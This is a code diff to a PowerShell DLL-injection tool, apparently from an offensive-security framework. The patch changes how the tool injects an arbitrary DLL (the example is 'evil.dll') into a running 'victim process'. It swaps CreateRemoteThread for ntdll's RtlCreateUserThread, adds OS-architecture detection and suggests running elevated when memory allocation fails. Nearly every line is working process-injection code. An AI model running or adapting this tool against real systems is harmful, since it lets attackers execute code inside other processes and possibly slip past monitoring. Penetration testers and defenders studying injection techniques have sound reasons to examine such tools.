@@ -25,7 +25,7 @@ Name of the dll to inject. This can be an absolute or relative path.
 
 .EXAMPLE
 
-C:\PS> Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
+Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
 
 Description
 -----------
@@ -207,16 +207,13 @@ http://www.exploit-monday.com
     $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
     $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
     $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
-    $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+    $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
+    $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
+    $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
     $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
     $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
     $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
 
-    # Assume CPU to be 64-bit unless determined otherwise.
-    $64bitCPU = $True
-    
     # Determine the bitness of the running PowerShell process based upon the size of the IntPtr type.
     if ([IntPtr]::Size -eq 4)
     {
@@ -227,6 +224,14 @@ http://www.exploit-monday.com
         $PowerShell32bit = $False
     }
 
+    $OSArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+
+    switch ($OSArchitecture)
+    {
+        '32-bit' { $64bitOS = $False }
+        '64-bit' { $64bitOS = $True }
+    }
+
     # The address for IsWow64Process will be returned if and only if running on a 64-bit CPU. Otherwise, Get-ProcAddress will return $null.
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
 
@@ -235,23 +240,20 @@ http://www.exploit-monday.com
     	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
     	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
     }
-    else
-    {
-        # IsWow64Process does not exist and thus, the CPU is not 64-bit.
-    	$64bitCPU = $False
-    }
+
+    $Architecture = Get-PEArchitecture $Dll
+
+    Write-Verbose "Architecture of the dll to be injected: $Architecture"
 
     # Open a handle to the process you want to inject into
     $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
 
     if (!$hProcess)
     {
-        THrow 'Unable to open process handle.'
+        Throw 'Unable to open process handle.'
     }
 
-    $Architecture = Get-PEArchitecture $Dll
-
-    if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
+    if ($64bitOS) # Only perform theses checks if OS is 64-bit
     {
         if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
         {
@@ -293,7 +295,7 @@ http://www.exploit-monday.com
     $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) # (0x3000 = Reserve|Commit, 4 = RW)
     if ($RemoteMemAddr -eq [IntPtr]::Zero)
     {
-        Throw 'Unable to allocate memory in remote process.'
+        Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
     }
     Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
@@ -302,10 +304,10 @@ http://www.exploit-monday.com
     Write-Verbose "Dll path written sucessfully."
 
     # Execute dll as a remote thread
-    $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $LoadLibraryAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
-    if (!$ThreadHandle)
+    $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
+    if ($Result)
     {
-        Throw 'Unable to launch remote thread.'
+        Throw "Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))"
     }
     
     $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
@@ -313,16 +315,16 @@ http://www.exploit-monday.com
     # Close process handle
     $CloseHandle.Invoke($hProcess) | Out-Null
 
-    Write-Verbose 'Dll injection complete!'
-
     # Extract just the filename from the provided path to the dll.
     $FileName = Split-Path $Dll -Leaf
-    $DllInfo = (Get-Process -Id $ProcessID).Modules | ? { $_.FileName.Contains($FileName) } | fl * | Out-String
+    $DllInfo = (Get-Process -Id $ProcessID).Modules | ? { $_.FileName.Contains($FileName) }
 
     if (!$DllInfo)
     {
         Throw "Dll did dot inject properly into the victim process."
     }
 
-    Write-Verbose "Injected DLL information:$($DllInfo)"
+    Write-Verbose 'Dll injection complete!'
+
+    $DllInfo
 }
